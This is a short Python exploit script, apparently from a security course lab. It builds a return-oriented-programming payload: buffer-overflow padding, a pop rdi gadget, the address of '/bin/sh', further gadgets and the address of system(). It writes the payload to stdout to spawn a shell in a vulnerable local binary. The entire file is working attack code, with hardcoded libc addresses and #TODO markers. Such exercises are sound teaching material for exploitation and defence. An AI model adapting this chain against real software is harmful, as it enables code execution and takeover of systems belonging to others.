#!/usr/bin/env python3

import sys

# address of /bin/sh: find /bin/sh
filep = b'\x4f\x00\xf6\xf7\xff\x7f\x00\x00' #TODO
#0x7ffff7f6004f

# address of system: p system
syscall = b'\x20\x69\xe1\xf7\xff\x7f\x00\x00' #TODO
#0x7ffff7e16920

# address of gadget: pop rdi; ret
gad1 = b'\x65\x1c\xdf\xf7\xff\x7f\x00\x00' #TODO
#0x7ffff7df1c65 -- 
#.so.2 -- 0x7ffff7fccde4

# address of gadget: pop r11; pop rbp; pop r12; ret
gad2 = b'\x8f\xd1\xec\xf7\xff\x7f\x00\x00' #TODO
#0x7ffff7ecd18f

# padding for the extra pops
padding = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

# address of gadget: add rsp, 0x18 ; jmp r11
gad3 = b'\xf4\xd2\xfd\xf7\xff\x7f\x00\x00' #TODO
#.so.2 --  0x7ffff7fdd2f4

num_of_A = 104 #TODO
# 104 = 80 (size of buffer) + 8 * 3 (number of instructions before return)
payload = b'A' * num_of_A + gad1 + filep + gad2 + syscall + padding + gad3

print("Press enter when ready...", file=sys.stderr)
sys.stdin.buffer.readline()

sys.stdout.buffer.write(payload)

